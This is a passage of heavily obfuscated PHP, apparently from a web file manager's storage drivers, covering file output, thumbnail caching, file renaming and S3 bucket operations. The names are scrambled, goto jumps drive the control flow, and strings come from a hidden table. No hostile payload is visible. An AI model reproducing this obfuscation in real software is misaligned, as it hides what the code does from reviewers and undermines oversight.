1024 * 1024 * 2) { $e¬õÄ´µÓá = !1; } if ($e¬õÄ´µÓá) { header($bÇĞÂ…Ä¡Ã[156] . ($E†çøÑËíá - $BÁåÂÅ»Ò + 1)); } goto AĞ¥Ê¸İã¶; Aà ê‹½Œ: } public function fileOutServer($Bì¤Øƒßİ¤, $B‡‰½”Ç‘Œ = false, $F§Ğ©è‹ = false, $e­É¶Œ…ÄË = '') { $this->fileOut($Bì¤Øƒßİ¤, $B‡‰½”Ç‘Œ, $F§Ğ©è‹, $e­É¶Œ…ÄË); } public function fileOutLink($D¬”‰ÑàØ») { header($_SERVER[ÒÆ›ÆØÎ¾][159] . $D¬”‰ÑàØ»); die; } public function cacheMethod($CëìÊïæ”¦, $Bğéã³¹ƒÑ, $f¯—˜¹Úƒ = null) { goto C¶Ê÷š¥Ë‡; C¶Ê÷š¥Ë‡: $E¼Ì°¦Ï†º =& $_SERVER[ÒÆ›ÆØÎ¾]; static $BŒ™°…‹ = array(); $aìÈê’„²ì = $Bğéã³¹ƒÑ ? ltrim($this->getPathOuter($Bğéã³¹ƒÑ), $E¼Ì°¦Ï†º[8]) : $Bğéã³¹ƒÑ; goto f¾Ù…æ˜›; C–à¸¡ìè¼: $càÙÍÍÒ†ô = $this->{$CëìÊïæ”¦}($Bğéã³¹ƒÑ); $BŒ™°…‹[$FÛó Ä‚×] = $càÙÍÍÒ†ô; return $càÙÍÍÒ†ô; goto A¯¢‚†÷ç ; f´ˆ†Çº‹: if (!is_null($f¯—˜¹Úƒ)) { $BŒ™°…‹[$FÛó Ä‚×] = $f¯—˜¹Úƒ; return; } $càÙÍÍÒ†ô = isset($BŒ™°…‹[$FÛó Ä‚×]) ? $BŒ™°…‹[$FÛó Ä‚×] : null; if (!is_null($càÙÍÍÒ†ô)) { return $càÙÍÍÒ†ô; } goto C–à¸¡ìè¼; f¾Ù…æ˜›: $FÛó Ä‚× = $E¼Ì°¦Ï†º[160] . $CëìÊïæ”¦ . $E¼Ì°¦Ï†º[161] . rtrim($aìÈê’„²ì, $E¼Ì°¦Ï†º[8]); if (is_null($CëìÊïæ”¦)) { $BŒ™°…‹ = array(); return; } if (is_null($Bğéã³¹ƒÑ)) { unset($BŒ™°…‹[$FÛó Ä‚×]); return; } goto f´ˆ†Çº‹; A¯¢‚†÷ç : } public function fileOutImage($AÅÔÍ¡ªÏÔ, $C…°”®“— = 250) { goto A‚Ñ‹°éï¯; CÒ»Í‚–‚Û: $dˆ‚•áç„ = "{$a¾ §Ü•Ş™}\137{$C…°”®“—}\56\160\156\x67"; if (!($cõëíÎ½›Õ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $CÃ´çŸ‘˜†[172]))) { $c«·Ÿ§„‚ä = IO::mkdir(IO_PATH_SYSTEM_TEMP . $CÃ´çŸ‘˜†[173]); } else { $c«·Ÿ§„‚ä = KodIO::make($cõëíÎ½›Õ); } if ($cõëíÎ½›Õ = IO::fileNameExist($c«·Ÿ§„‚ä, $dˆ‚•áç„)) { $Bèó£å¿Ì = KodIO::make($cõëíÎ½›Õ); return IO::fileOut($Bèó£å¿Ì, !1, $c‰’’‡Ü‘); } goto Câ”ßÀÌİ¸; A‚Ñ‹°éï¯: $CÃ´çŸ‘˜† =& $_SERVER[ÒÆ›ÆØÎ¾]; set_timeout(); if (substr($AÅÔÍ¡ªÏÔ, 0, 4) == $CÃ´çŸ‘˜†[147]) { $this->fileOutLink($AÅÔÍ¡ªÏÔ); } goto BèÇ‘ÂÃïì; eìÓƒÁ­ÊÑ: if (isset($GLOBALS[$CÃ´çŸ‘˜†[162]]) && $GLOBALS[$CÃ´çŸ‘˜†[162]][$CÃ´çŸ‘˜†[76]] == $E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[76]]) { $EĞ¦º°ªˆ¸ = $GLOBALS[$CÃ´çŸ‘˜†[162]][$CÃ´çŸ‘˜†[163]]; if (!$E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[164]]) { $E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[164]] = $GLOBALS[$CÃ´çŸ‘˜†[162]]; } if (isset($EĞ¦º°ªˆ¸[$CÃ´çŸ‘˜†[165]])) { if ($EĞ¦º°ªˆ¸[$CÃ´çŸ‘˜†[165]] <= $C…°”®“— && $EĞ¦º°ªˆ¸[$CÃ´çŸ‘˜†[166]] <= $C…°”®“—) { $Fœ‹¥‹ë¦Ú = !0; } } $c‰’’‡Ü‘ = $E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[164]][$CÃ´çŸ‘˜†[28]]; } if ($E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[78]] <= 1024 * 50 || $Fœ‹¥‹ë¦Ú || !function_exists($CÃ´çŸ‘˜†[167]) || $E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[168]] == $CÃ´çŸ‘˜†[169]) { return $this->fileOut($AÅÔÍ¡ªÏÔ, !1, $c‰’’‡Ü‘); } if (isset($E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[164]][$CÃ´çŸ‘˜†[170]])) { $a¾ §Ü•Ş™ = $E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[164]][$CÃ´çŸ‘˜†[170]]; } else { if (isset($E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[164]][$CÃ´çŸ‘˜†[171]])) { $a¾ §Ü•Ş™ = $E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[164]][$CÃ´çŸ‘˜†[171]]; } else { $a¾ §Ü•Ş™ = md5("{$E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[28]]}\x5f{$E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[76]]}\137{$E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[78]]}"); } } goto CÒ»Í‚–‚Û; DöŠÎ†—­­: del_file($Bèó£å¿Ì); IO::fileOut($DŸå’«ŸÛ); goto DÎÉì°ç‰; BèÇ‘ÂÃïì: $E­Ÿ„·Ğ‹¦ = $this->info($AÅÔÍ¡ªÏÔ); $c‰’’‡Ü‘ = $E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[28]]; $Fœ‹¥‹ë¦Ú = !1; goto eìÓƒÁ­ÊÑ; Câ”ßÀÌİ¸: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $Bèó£å¿Ì = DATA_THUMB . $dˆ‚•áç„; del_file($Bèó£å¿Ì); goto b³ĞªŠ¢ğ; b³ĞªŠ¢ğ: if (!@file_exists($Bèó£å¿Ì)) { $fÛÅŸ¢÷æ· = TEMP_FILES; if (!is_dir($fÛÅŸ¢÷æ·)) { mk_dir($fÛÅŸ¢÷æ·); } $d¤±Ë«ÏÉë = $fÛÅŸ¢÷æ· . $a¾ §Ü•Ş™ . $CÃ´çŸ‘˜†[95] . $E­Ÿ„·Ğ‹¦[$CÃ´çŸ‘˜†[168]]; if (!@file_exists($d¤±Ë«ÏÉë)) { $d¤±Ë«ÏÉë = $this->download($AÅÔÍ¡ªÏÔ, $d¤±Ë«ÏÉë); } ImageThumb::createThumb($d¤±Ë«ÏÉë, $Bèó£å¿Ì, $C…°”®“—, $C…°”®“— * 10); } if (!file_exists($Bèó£å¿Ì) || filesize($Bèó£å¿Ì) < 100) { return @file_exists($d¤±Ë«ÏÉë) ? IO::fileOut($d¤±Ë«ÏÉë) : $this->fileOut($AÅÔÍ¡ªÏÔ); } if (!($DŸå’«ŸÛ = IO::move($Bèó£å¿Ì, $c«·Ÿ§„‚ä))) { return IO::fileOut($Bèó£å¿Ì); } goto DöŠÎ†—­­; DÎÉì°ç‰: } public function fileOutImageServer($eì°ŸßÙ»ø, $A­²ó¿«† = 250) { $this->fileOutImage($eì°ŸßÙ»ø, $A­²ó¿«†); } public function fileNameAuto($fìºƒ–èÂ, $fÒ†›ŠÅ¶…, $F›ÆÂ¸ïõÏ = REPEAT_RENAME, $D×›àÊÆÄ­ = false) { goto C‚òÉ¶†„‚; eÏ¡Á¥ê: if ($F›ÆÂ¸ïõÏ == REPEAT_SKIP) { return !1; } $C‚ÎØÉïéå = $bÏèŠè‰³[95] . get_path_ext($fÒ†›ŠÅ¶…); $C‚ÎØÉïéå = $C‚ÎØÉïéå == $bÏèŠè‰³[95] || $D×›àÊÆÄ­ ? $bÏèŠè‰³[33] : $C‚ÎØÉïéå; goto Cõ¼´‘öøÈ; C‚òÉ¶†„‚: $bÏèŠè‰³ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D¢„ŒÂíô® = $fìºƒ–èÂ === $bÏèŠè‰³[33] ? $fÒ†›ŠÅ¶… : rtrim($fìºƒ–èÂ, $bÏèŠè‰³[8]) . $bÏèŠè‰³[8] . $fÒ†›ŠÅ¶…; if ($F›ÆÂ¸ïõÏ == REPEAT_REPLACE || !$this->exist($D¢„ŒÂíô®) || $D×›àÊÆÄ­ && $F›ÆÂ¸ïõÏ != REPEAT_RENAME_FOLDER) { return $fÒ†›ŠÅ¶…; } goto eÏ¡Á¥ê; e¤˜ÀŒˆ¡: while ($this->exist(rtrim($fìºƒ–èÂ, $bÏèŠè‰³[8]) . $bÏèŠè‰³[8] . $FõËå§¶ä)) { $FõËå§¶ä = $DìÍŒË°ˆ . "\50{$câ‡ãÌš¯»}\51{$C‚ÎØÉïéå}"; $câ‡ãÌš¯»++; } return $FõËå§¶ä; goto B„îŠ—µ¼ë; Cõ¼´‘öøÈ: $câ‡ãÌš¯» = 1; $DìÍŒË°ˆ = substr($fÒ†›ŠÅ¶…, 0, strlen($fÒ†›ŠÅ¶…) - strlen($C‚ÎØÉïéå)); $FõËå§¶ä = $DìÍŒË°ˆ . "\x28{$câ‡ãÌš¯»}\x29{$C‚ÎØÉïéå}"; goto e¤˜ÀŒˆ¡; B„îŠ—µ¼ë: } private function fileNameAutoList($D½¹õã”¢‰, $B†ºšî«¸é, $dŒˆ¾æõÁÄ = false) { goto cÖ„¯¥ÂÏñ; EÅù¢ÆéÚĞ: return $F—ÛÏ¡‰óñ; goto C®ˆÌ³ÖÉ‘; a‚Û¹³Ö®: $cßÃ‘¯¾Å = array_to_keyvalue($Fğ¤“ò™Æ, $f„Í®òæÌ’[33], $f„Í®òæÌ’[28]); $FŸœ¾Õ…Â÷ = $f„Í®òæÌ’[95] . get_path_ext($B†ºšî«¸é); $FŸœ¾Õ…Â÷ = $FŸœ¾Õ…Â÷ == $f„Í®òæÌ’[95] || $dŒˆ¾æõÁÄ ? $f„Í®òæÌ’[33] : $FŸœ¾Õ…Â÷; goto EÊ³ì®àâõ; cÖ„¯¥ÂÏñ: $f„Í®òæÌ’ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Fğ¤“ò™Æ = $this->listPath($D½¹õã”¢‰, !0); $Fğ¤“ò™Æ = array_merge($Fğ¤“ò™Æ[$f„Í®òæÌ’[75]], $Fğ¤“ò™Æ[$f„Í®òæÌ’[74]]); goto a‚Û¹³Ö®; EÊ³ì®àâõ: $b‡ìö®Ş÷ó = substr($B†ºšî«¸é, 0, strlen($B†ºšî«¸é) - strlen($FŸœ¾Õ…Â÷)); $F—ÛÏ¡‰óñ = $b‡ìö®Ş÷ó . "\50\x30\51{$FŸœ¾Õ…Â÷}"; for ($CÓÌ¿´›Ï² = 1; $CÓÌ¿´›Ï² <= count($cßÃ‘¯¾Å) + 1; $CÓÌ¿´›Ï²++) { $F—ÛÏ¡‰óñ = $b‡ìö®Ş÷ó . "\50{$CÓÌ¿´›Ï²}\x29{$FŸœ¾Õ…Â÷}"; if (!in_array_not_case($F—ÛÏ¡‰óñ, $cßÃ‘¯¾Å)) { return $F—ÛÏ¡‰óñ; } } goto EÅù¢ÆéÚĞ; C®ˆÌ³ÖÉ‘: } public function listAllFiles($AìŠ–¦ƒÃ¼, $d«ÜÛó½ôÜ, $f†½¤Ô¯‘Ó = array()) { goto d¾æŒ¦µÛÙ; cšÅ·º¿Í»: foreach (array_unique($DäŒÖÁ‡À) as $AßïÄàÔ“‚) { $BÀóÔëÌ‹‹ = array($d˜„‘ÜåÄƒ[76] => $this->getPathOuter($d˜„‘ÜåÄƒ[8] . $AìŠ–¦ƒÃ¼ . $d˜„‘ÜåÄƒ[8] . $AßïÄàÔ“‚), $d˜„‘ÜåÄƒ[77] => 1, $d˜„‘ÜåÄƒ[78] => 0); if (substr($AßïÄàÔ“‚, -1) != $d˜„‘ÜåÄƒ[8]) { $BÀóÔëÌ‹‹[$d˜„‘ÜåÄƒ[77]] = 0; $bÚÎšÃåËÎ = $this->getPath($AìŠ–¦ƒÃ¼ . $d˜„‘ÜåÄƒ[8] . $AßïÄàÔ“‚); $BÀóÔëÌ‹‹[$d˜„‘ÜåÄƒ[78]] = isset($f†½¤Ô¯‘Ó[$bÚÎšÃåËÎ]) ? $f†½¤Ô¯‘Ó[$bÚÎšÃåËÎ] : $this->size($bÚÎšÃåËÎ); } $e‘µæÃÈˆØ[] = $BÀóÔëÌ‹‹; } return $e‘µæÃÈˆØ; goto aÇ ´´Å½; d¾æŒ¦µÛÙ: $d˜„‘ÜåÄƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($d«ÜÛó½ôÜ)) { return array(); } $DäŒÖÁ‡À = array(); goto CòåÌöã½; CòåÌöã½: $AìŠ–¦ƒÃ¼ = trim($AìŠ–¦ƒÃ¼, $d˜„‘ÜåÄƒ[8]); foreach ($d«ÜÛó½ôÜ as $AßïÄàÔ“‚) { $DçŠè Š’… = ltrim(substr(trim($AßïÄàÔ“‚, $d˜„‘ÜåÄƒ[8]), strlen($AìŠ–¦ƒÃ¼)), $d˜„‘ÜåÄƒ[8]); $DäŒÖÁ‡À = array_merge($DäŒÖÁ‡À, $this->slicePath($DçŠè Š’…)); } $e‘µæÃÈˆØ = array(); goto cšÅ·º¿Í»; aÇ ´´Å½: } public function slicePath($bø¨Öã¨¾å) { $cÁ‹·Àšğí =& $_SERVER[ÒÆ›ÆØÎ¾]; $féÔˆòãÛ› = explode($cÁ‹·Àšğí[8], trim($bø¨Öã¨¾å, $cÁ‹·Àšğí[8])); $BŞòÜâãœ˜ = 0; do { ++$BŞòÜâãœ˜; $b˜‚îæƒ‘[] = implode($cÁ‹·Àšğí[8], array_slice($féÔˆòãÛ›, 0, $BŞòÜâãœ˜)) . $cÁ‹·Àšğí[8]; } while ($BŞòÜâãœ˜ < count($féÔˆòãÛ›)); $b˜‚îæƒ‘[count($féÔˆòãÛ›) - 1] = $bø¨Öã¨¾å; return $b˜‚îæƒ‘; } public function getHost() { $F¦Ù¡çŒÖ´ =& $_SERVER[ÒÆ›ÆØÎ¾]; $B–ç°Ø¤ğ = parse_url(trim($this->domain, $F¦Ù¡çŒÖ´[8])); $b”³´‹ßãõ = isset($B–ç°Ø¤ğ[$F¦Ù¡çŒÖ´[174]]) ? $B–ç°Ø¤ğ[$F¦Ù¡çŒÖ´[174]] : http_type(); $C¢…®›²”Â = isset($B–ç°Ø¤ğ[$F¦Ù¡çŒÖ´[175]]) ? $B–ç°Ø¤ğ[$F¦Ù¡çŒÖ´[175]] : $B–ç°Ø¤ğ[$F¦Ù¡çŒÖ´[76]]; if (isset($B–ç°Ø¤ğ[$F¦Ù¡çŒÖ´[176]])) { $C¢…®›²”Â .= $F¦Ù¡çŒÖ´[4] . $B–ç°Ø¤ğ[$F¦Ù¡çŒÖ´[176]]; } return $b”³´‹ßãõ . $F¦Ù¡çŒÖ´[177] . $C¢…®›²”Â; } public function pathEncode($aÖÊßÔ†) { $E†ì¾Øé¤ =& $_SERVER[ÒÆ›ÆØÎ¾]; return str_replace($E†ì¾Øé¤[178], $E†ì¾Øé¤[8], rawurlencode($aÖÊßÔ†)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($bº¾Ş¼Ÿ¼©) { set_timeout(); require_once SDK_DIR . $_SERVER[ÒÆ›ÆØÎ¾][179]; parent::__construct(); $this->_init($bº¾Ş¼Ÿ¼©); } public function _init($A¦ø„ğ„ô¥) { foreach ($A¦ø„ğ„ô¥ as $dÔ¶òáØÖ => $dÎ³˜¦÷­Ğ) { if (isset($this->{$dÔ¶òáØÖ})) { $this->{$dÔ¶òáØÖ} = $dÎ³˜¦÷­Ğ; } } $this->endpoint = $A¦ø„ğ„ô¥[$_SERVER[ÒÆ›ÆØÎ¾][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($BìÚ™‹Êğç = "\x76\64") { $this->signVer = $BìÚ™‹Êğç; $this->client->setSignatureVersion($BìÚ™‹Êğç); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto dƒÙíˆ­ì; bãŞ¬ÉÁˆ: $fç¬„œÎÎñ = array($fÌö™ŠŒêÙ[186], $fÌö™ŠŒêÙ[187], $fÌö™ŠŒêÙ[188], $fÌö™ŠŒêÙ[189], $fÌö™ŠŒêÙ[190]); $CÏÉœ¨÷ñ = array_diff($fç¬„œÎÎñ, $cÁâ‰õ°Ë); return empty($CÏÉœ¨÷ñ); goto fÛç®ËÖ®š; FæÃœ‘ù„…: if ($EÓÃ¯¨Ğ‡»[$fÌö™ŠŒêÙ[181]] != $fÌö™ŠŒêÙ[182] || $EÓÃ¯¨Ğ‡»[$fÌö™ŠŒêÙ[183]] != $fÌö™ŠŒêÙ[182]) { return !1; } $cÁâ‰õ°Ë = array_map($fÌö™ŠŒêÙ[184], $EÓÃ¯¨Ğ‡»[$fÌö™ŠŒêÙ[185]]); if (!is_array($cÁâ‰õ°Ë)) { $cÁâ‰õ°Ë = array(); } goto bãŞ¬ÉÁˆ; dƒÙíˆ­ì: $fÌö™ŠŒêÙ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÓÃ¯¨Ğ‡» = $this->getBucketCors(); if (!$EÓÃ¯¨Ğ‡» || !is_array($EÓÃ¯¨Ğ‡»)) { return !1; } goto FæÃœ‘ù„…; fÛç®ËÖ®š: } public function mkfile($AŠ—˜ä¼Ñ›, $cğéóô•ÑÊ = '', $aÇ®”†‘åÉ = REPEAT_RENAME) { $EŒ¨†½ÅÆ¼ = $this->setContent($AŠ—˜ä¼Ñ›, $cğéóô•ÑÊ); if ($EŒ¨†½ÅÆ¼ !== !1) { return $this->getPathOuter($AŠ—˜ä¼Ñ›); } return !1; } public function mkdir($BØÄìÛŒ’˜, $fèÂ¥½Ü² = REPEAT_SKIP) { $a÷‘‚µËêó =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($BØÄìÛŒ’˜) && $BØÄìÛŒ’˜ !== $a÷‘‚µËêó[191]) { return !1; } if ($this->_isFolder($BØÄìÛŒ’˜)) { return $this->getPathOuter($BØÄìÛŒ’˜); } $d÷Û…—•Ÿñ = $this->setContent($BØÄìÛŒ’˜, $a÷‘‚µËêó[33], !0); if ($d÷Û…—•Ÿñ !== !1) { return $this->getPathOuter($BØÄìÛŒ’˜); } return !1; } public function copyFile($Då¿áÊÂÏ, $C²…áìß‡, $e£¼ƒÕßó… = array()) { $Dà‚•×¹ã =& $_SERVER[ÒÆ›ÆØÎ¾]; $cÔ´»¶†ÒŒ = $this->objectMeta($Då¿áÊÂÏ); if (!$cÔ´»¶†ÒŒ) { return !1; } if ($cÔ´»¶†ÒŒ[$Dà‚•×¹ã[78]] <= 1024 * 1024 * 200) { $Aƒ­£ìÂ«  = $this->client->copyObject($this->bucket, $Då¿áÊÂÏ, $this->bucket, $C²…áìß‡, $Dà‚•×¹ã[192], $e£¼ƒÕßó…); } else { $Aƒ­£ìÂ«  = $this->client->multiCopyObject($this->bucket, $Då¿áÊÂÏ, $this->bucket, $C²…áìß‡, $e£¼ƒÕßó…); } $Aƒ­£ìÂ«  = $Aƒ­£ìÂ«  ? $this->getPathOuter($C²…áìß‡) : !1; return $Aƒ­£ìÂ« ; } public function moveFile($fÁ—ºïËª£, $A„Ñ¯İ¤•Æ) { if ($this->copyFile($fÁ—ºïËª£, $A„Ñ¯İ¤•Æ)) { $this->delFile($fÁ—ºïËª£); return $this->getPathOuter($A„Ñ¯İ¤•Æ); } return !1; } public function delFile($fÌÒ˜ùÃÙ‚) { return $this->client->deleteObject($this->bucket, $fÌÒ˜ùÃÙ‚); } public function delFolder($açœô¹­¯¼) { goto C‹–³À¶ƒ¡; B›Ÿ¤ ïå: if (!empty($açœô¹­¯¼) && $açœô¹­¯¼ !== $aù¥»²‰§–[191] && !in_array($CÅ‘ìİ­å‘, $ašší°…ºš[$aù¥»²‰§–[75]])) { $ašší°…ºš[$aù¥»²‰§–[75]][] = $CÅ‘ìİ­å‘; } $A¹î§Ù¦×— = $this->delByBatch($ašší°…ºš[$aù¥»²‰§–[74]]); if (!$A¹î§Ù¦×—) { return !1; } goto AİÒƒ§ã; AİÒƒ§ã: $A¹î§Ù¦×— = $this->delByBatch($ašší°…ºš[$aù¥»²‰§–[75]]); if (!$A¹î§Ù¦×—) { return !1; } return $this->delFile($CÅ‘ìİ­å‘); goto d »•Ûì´ò; C‹–³À¶ƒ¡: $aù¥»²‰§– =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->exist($açœô¹­¯¼)) { return !0; } $this->listItemCache = !1; goto aŞ°Ë¤È½„; aŞ°Ë¤È½„: $ašší°…ºš = $this->fileList($açœô¹­¯¼); $this->listItemCache = !0; $CÅ‘ìİ­å‘ = trim($açœô¹­¯¼, $aù¥»²‰§–[8]) . $aù¥»²‰§–[8]; goto B›Ÿ¤ ïå; d »•Ûì´ò: } private function delByBatch($aìé…ÕŒ“) { foreach (array_chunk($aìé…ÕŒ“, 1000) as $C³…À¾‘İÌ) { $Cìõæ–è™÷ = $this->client->deleteObjects($this->bucket, $C³…À¾‘İÌ); if (!$Cìõæ–è™÷) { return !1; } } return !0; } public function rename($AŒî…‘¡°ª, $b±‚¡ĞØ‰¤) { return $this->renameObject($AŒî…‘¡°ª, $b±‚¡ĞØ‰¤); } public function listPath($cª¯» §›¼, $c†¸Îµ…ƒœ = false) { $AÓß¸­½â =& $_SERVER[ÒÆ›ÆØÎ¾]; $f³¸‡×Ï‘¤ = $this->fileList($cª¯» §›¼, $AÓß¸­½â[8], !0); foreach ($f³¸‡×Ï‘¤[$AÓß¸­½â[75]] as $bá¥ŸğÆÅæ => $F‚îÎÀÚÀª) { $f³¸‡×Ï‘¤[$AÓß¸­½â[75]][$bá¥ŸğÆÅæ] = $this->folderInfo($F‚îÎÀÚÀª, $c†¸Îµ…ƒœ); } foreach ($f³¸‡×Ï‘¤[$AÓß¸­½â[74]] as $bá¥ŸğÆÅæ => $F‚îÎÀÚÀª) { $f³¸‡×Ï‘¤[$AÓß¸­½â[74]][$bá¥ŸğÆÅæ] = $this->fileInfo($F‚îÎÀÚÀª[$AÓß¸­½â[28]], $c†¸Îµ…ƒœ, $F‚îÎÀÚÀª); } return $f³¸‡×Ï‘¤; } private function fileInfo($câßËñêó, $Dô¢–Ö¯ì¿ = false, $FÛƒµ§òîµ = array()) { goto bÙ‚éÎêø; A¯’¯›Ã‹ˆ: $C”©¡Ç›»[$F°ÊÕÊ•»[194]] = $C”©¡Ç›»[$F°ÊÕÊ•»[84]] = 0; $C”©¡Ç›»[$F°ÊÕÊ•»[195]] = $C”©¡Ç›»[$F°ÊÕÊ•»[196]] = !0; if (empty($FÛƒµ§òîµ)) { $FÛƒµ§òîµ = $this->objectMeta($câßËñêó); if (!$FÛƒµ§òîµ) { return $C”©¡Ç›»; } } goto c¥ÃíÔÖÎÚ; c¥ÃíÔÖÎÚ: if (isset($FÛƒµ§òîµ[$F°ÊÕÊ•»[197]])) { $C”©¡Ç›»[$F°ÊÕÊ•»[84]] = $FÛƒµ§òîµ[$F°ÊÕÊ•»[197]]; } if (isset($FÛƒµ§òîµ[$F°ÊÕÊ•»[78]])) { $C”©¡Ç›»[$F°ÊÕÊ•»[78]] = $FÛƒµ§òîµ[$F°ÊÕÊ•»[78]]; } return $C”©¡Ç›»; goto b³õ‡ŞŞ¦Ï; bÙ‚éÎêø: $F°ÊÕÊ•» =& $_SERVER[ÒÆ›ÆØÎ¾]; $C”©¡Ç›» = array($F°ÊÕÊ•»[28] => $this->pathThis($câßËñêó), $F°ÊÕÊ•»[76] => $this->getPathOuter($câßËñêó), $F°ÊÕÊ•»[29] => $F°ÊÕÊ•»[193], $F°ÊÕÊ•»[168] => $this->ext($câßËñêó), $F°ÊÕÊ•»[78] => isset($FÛƒµ§òîµ[$F°ÊÕÊ•»[78]]) ? $FÛƒµ§òîµ[$F°ÊÕÊ•»[78]] : 0); if ($Dô¢–Ö¯ì¿) { return $C”©¡Ç›»; } goto A¯’¯›Ã‹ˆ; b³õ‡ŞŞ¦Ï: } private function folderInfo($FÚ‡¬ÁŠæ, $b¬º¯×Ê· = false) { goto bªáªÊÖÆœ; d“Æ¹¬Õ¨‹: return $e¢‘©Öõô; goto eíÒ‰–Š; bªáªÊÖÆœ: $cÁ«è‘‚¨Ö =& $_SERVER[ÒÆ›ÆØÎ¾]; $e¢‘©Öõô = array($cÁ«è‘‚¨Ö[28] => $this->pathThis($FÚ‡¬ÁŠæ), $cÁ«è‘‚¨Ö[76] => $this->getPathOuter($cÁ«è‘‚¨Ö[8] . $FÚ‡¬ÁŠæ), $cÁ«è‘‚¨Ö[29] => $cÁ«è‘‚¨Ö[77]); if ($b¬º¯×Ê·) { return $e¢‘©Öõô; } goto F¥ŞÉÏàÈ½; eï¨¢øœä‘: $FÚ‡¬ÁŠæ = trim($FÚ‡¬ÁŠæ, $cÁ«è‘‚¨Ö[8]) . $cÁ«è‘‚¨Ö[8]; $C·‚Š™¾ï = $this->objectMeta($FÚ‡¬ÁŠæ); if (isset($C·‚Š™¾ï[$cÁ«è‘‚¨Ö[197]])) { $e¢‘©Öõô[$cÁ«è‘‚¨Ö[194]] = $C·‚Š™¾ï[$cÁ«è‘‚¨Ö[197]]; } goto d“Æ¹¬Õ¨‹; F¥ŞÉÏàÈ½: $e¢‘©Öõô[$cÁ«è‘‚¨Ö[194]] = $e¢‘©Öõô[$cÁ«è‘‚¨Ö[84]] = 0; $e¢‘©Öõô[$cÁ«è‘‚¨Ö[195]] = $e¢‘©Öõô[$cÁ«è‘‚¨Ö[196]] = !0; if ($FÚ‡¬ÁŠæ == $cÁ«è‘‚¨Ö[33]) { return $e¢‘©Öõô; } goto eï¨¢øœä‘; eíÒ‰–Š: } private function fileList($bò…«Ç´Ø, $F ¬¨Ç‹ = '', $b˜Áî¡„Üø = 0) { goto B¯ÍÎáºİ; eî„ĞÁ¢åÌ: foreach ($aŞ•Ôâ‰Ñ†[$D˜ÖÈÒó¥ [198]] as $E—¬£Ú‹ÓÅ) { goto a¸öÖÚ¹ğª; cö¼Åá«ˆ†: $cøÊ©‡ÓŒ¯[] = $b˜Áî¡„Üø ? $E—¬£Ú‹ÓÅ : $aÄ°÷İÇ—ƒ; goto FÇô‚ö°; fÏ‰‚Ú·¹ì: $B×‚ğ‘‚„¦ = $FŞŠŠì¥´ == 0 && substr($aÄ°÷İÇ—ƒ, strlen($aÄ°÷İÇ—ƒ) - 1, 1) == $D˜ÖÈÒó¥ [8] ? !0 : !1; if ($a’˜ÚÑ–Œ˜) { $this->cacheMethod($D˜ÖÈÒó¥ [199], $aÄ°÷İÇ—ƒ, $B×‚ğ‘‚„¦); $this->cacheMethod($D˜ÖÈÒó¥ [200], $aÄ°÷İÇ—ƒ, $E—¬£Ú‹ÓÅ); } if ($B×‚ğ‘‚„¦) { $AÇ«¾Üì»å[] = $aÄ°÷İÇ—ƒ; continue; } goto cö¼Åá«ˆ†; a¸öÖÚ¹ğª: $aÄ°÷İÇ—ƒ = $E—¬£Ú‹ÓÅ[$D˜ÖÈÒó¥ [28]]; if ($aÄ°÷İÇ—ƒ == $CóÑõŠÀ¤°) { continue; } $FŞŠŠì¥´ = isset($E—¬£Ú‹ÓÅ[$D˜ÖÈÒó¥ [78]]) ? $E—¬£Ú‹ÓÅ[$D˜ÖÈÒó¥ [78]] : 0; goto fÏ‰‚Ú·¹ì; FÇô‚ö°: } foreach ($aŞ•Ôâ‰Ñ†[$D˜ÖÈÒó¥ [201]] as $E—¬£Ú‹ÓÅ) { $AÇ«¾Üì»å[] = $E—¬£Ú‹ÓÅ[$D˜ÖÈÒó¥ [28]]; if ($a’˜ÚÑ–Œ˜) { $this->cacheMethod($D˜ÖÈÒó¥ [199], $E—¬£Ú‹ÓÅ[$D˜ÖÈÒó¥ [28]], !0); } } if ($a’˜ÚÑ–Œ˜) { $this->cacheMethod($D˜ÖÈÒó¥ [199], $bò…«Ç´Ø, !0); } goto E¸“ĞÈÛ‘“; fÁäÇÎè¡Ñ: if (!$aŞ•Ôâ‰Ñ†) { return array($D˜ÖÈÒó¥ [75] => array(), $D˜ÖÈÒó¥ [74] => array()); } $a’˜ÚÑ–Œ˜ = $this->listItemCache === !1 ? !1 : !0; $AÇ«¾Üì»å = $cøÊ©‡ÓŒ¯ = array(); goto eî„ĞÁ¢åÌ; B¯ÍÎáºİ: $D˜ÖÈÒó¥  =& $_SERVER[ÒÆ›ÆØÎ¾]; $CóÑõŠÀ¤° = rtrim($bò…«Ç´Ø, $D˜ÖÈÒó¥ [8]) . $D˜ÖÈÒó¥ [8]; $aŞ•Ôâ‰Ñ† = $this->listObjs($CóÑõŠÀ¤°, null, null, $F ¬¨Ç‹); goto fÁäÇÎè¡Ñ; 